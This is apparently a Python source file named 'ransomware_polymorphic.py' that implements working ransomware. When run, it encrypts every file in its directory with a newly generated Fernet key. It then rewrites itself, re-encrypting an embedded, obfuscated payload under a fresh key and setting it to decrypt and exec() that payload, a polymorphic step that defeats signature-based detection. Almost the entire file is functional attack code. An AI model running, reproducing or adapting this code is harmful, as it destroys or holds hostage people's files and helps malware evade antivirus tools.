import inspect
import os
from cryptography.fernet import Fernet
import hashlib


# ---------------------------------------------------------------------------
# Getting file Hash Unrelated to the virus code
def hash_file(filename):
   h = hashlib.sha1()
   with open(filename,'rb') as file:
       chunk = 0
       while chunk != b'':
           chunk = file.read(1024)
           h.update(chunk)

   return h.hexdigest()

message = hash_file(os.path.basename(__file__))
print("Hash of the file is: ", message)
# ---------------------------------------------------------------------------


def decrypt(token, key):
    fer = Fernet(key)
    virus = fer.decrypt(token).decode()
    exec(virus)


# START
key = "e16b7KascP6d59jz1owB83sOfelq1qA4-4OYJ0foU60="
token = "gAAAAABnNgHFjrZAaBCA-6h8iwbTsNrN5dzBeiOupBK1Y2_V6z_LH-sAKbxw0U13ouEtlM80ShxBkAT-sTf1NP_myY9tbEgAJV3b7XgHypz7XFuSCrdcXe4JbpAIDONdZHw_TWwT6OuLkRUYCrmYlVTaW-H8rxPMkxN1q2eQx59fme7Tnip_yXoqCYTlQfcMautzktlBxsqxSbSSIU4FkZ4QmLQtL9BSGSyi6taRO-QUcML-lDfp5B_u8M_3s5eo-WE7qFXhovuHBDQAOvsv3H7Q89sYZ_1RgWkAQQ8Mjn64a86Agxdxg20OJ6RypMLk4SO1KyNfddPuDyjnAHxPFhRvntQY5YvhBu_xUJBFvtOQ4RgD4xNz4_FQbnwKXhgYOEG-1zUpLebcULVBqd0xJwuKebYogxzv6F5IfvHu1R4xFivJytHAyBVRTmsBDmXIZwLc-d6WyfJa9x1t-aqWPvaZmEcp5OmM98jhRYsquhTncKdGNKT18T2IFVaKkrWWx5s4oR7h3sHImLafPsSSGz-l9LnG3qFbMi8l8plQD5HHVteB8XhnBCVF91LUCHnNLUbCCVYgl7YunmYFKkBN9hok1VqUIglDXxbEgST7byXQ6oP2zMIt-mW9FljU_cUqb8NQcst3NhwmGk0Lq3rTmYrgax-hwySBHVwHQIPzsoP3_3-JkCtdkfqb_yOnUeV5rsTGe3nklMNXbXMdfPjwsRrBSthlrN0lCYHvwEKR-rx5UGpHOJum0i7TJ1nArHET3jrICffaaFi0DPdMFVgLpDeMbHJdtQoP7yy-FhFqpIayP2sliZX2bOhIiyfAY9e-u4LVByo5EBrfDbiwSDZZ-bYoeBM1WXrFhoVQgnibkuQBmoB4ZIAzFQWXPAkSeYY9PKfm4XtF3pECkOR74eZ-LPT0DBQG1aKPlufzwvvC21yGPer3JAQfG40MrT_90_YdLGtBjkvc3HZ9_EqddjgRiOxpZRgEfZN-Uikx6BMOQEj79y-g39bb8PbMG6sDpEOVuhE6ERVbMrEFilUflO_oX3mloo9i8c-i6krlZ4bCggxL0v5k9BndkiZEsEXJSy3B85g_dO_pzH3-bHqnkcKmHSIRz0UmrqOlnQiHGb-_CDY6mxHVbfmv-q-CUNXj0Vcqsq_CyQAHpIMWAzoIrergilszxudHRE8bc7mMyaubgIgp6CrtbJNQ5KE6b1NhA3pRuOSvYxbfKSubDknewsUKm3vdywHSp8RSLY85V8PezN75b-TsMDEA8yWCausMXUymVjA79kqBSj30WcxWnOPAt44kQWv72vG7-bvxutLlpRIp8JKaXto2Q-DN08YvqagwtF25Zmd7ruw9ODZSMX51RFn3u5yleBzSFG1Y7F6p9zmI8k4hWCNYUOXZ24g0sPFrOtyZa3jmburStDuv9YzFqLnM8y1jodIMTa60UeBAixA4EEu1_eSFcDFc0mLcMemUJFKZiA2uWyrgkIP0YefNT0lCB2FzQyPPOBIJJ1kStoIdCaWLnPe6rgHpPCFYysXyC1aYFUyq2qsDS4yAAMvMgZtRSa8-lIC6latuqhUuvYmPJqKdS3b0VXF7LZuSzdxyip4sJtLMeCNMu-oUniG2Ypd4HgGyUXShejO_neuwHYaR9d8rjg72C2doknEXEFHJumZvhSElGM51iv33XPtNt-GtCz5HBT3DLEuJxn8RIhmE8wrKUZLEqZeK_YIBRE-Lj0yyZc4q3WabKjrlmxuAbc4-PzNTYk8-h2y-R-Pa-0_LAfKDjj4n1ubAUUdKS9sdoWLp-b6-vCXay-U37oaJBVFYWFQEgeIBOJq7Jx6VAZ3yaJuWD5uhJqiYjCzhmLShGGuj6fKhGhsQQnhuloJ2OqIHlV5jnsNvKF7Kb9R3luiMj5v_s2_ykNzwMHSC6Fx-jzyg2_fWYOYC7HrgIv4sl-t1hFOSP-TgAuOOwOKHcNbTnwPpsNq2K7E="

def run():
    files = []

    for file in os.listdir():
        if file == "ransomware_polymorphic.py" or file == "thekey.key" or file == "decrypt_ransomware.py":
            continue
        if os.path.isfile(file):
            files.append(file)

    print(files)

    key1 = Fernet.generate_key()

    with open("thekey.key", "wb") as thekey:
        thekey.write(key1)

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key1).encrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(contents_encrypted)

    fname = os.path.basename(__file__)
    lines = []
    with open(fname, 'r') as f:
        lines = f.readlines()
    
    with open('lol', 'w') as f:
        for line in lines:
            if line.startswith("# START"):
                break
            f.write(line)

        f.write("# START\n")
        global key
        global token

        fer = Fernet(key)
        virus = fer.decrypt(token).decode()

        key = Fernet.generate_key()
        fer = Fernet(key)
        token = fer.encrypt(virus.encode())
    
        f.write("key = \"{}\"\n".format(key.decode()))
        f.write("token = \"{}\"\n".format(token.decode()))
        f.write("\ndecrypt(token, key)\n")
    
    os.remove(fname)
    os.rename("lol", fname)


run()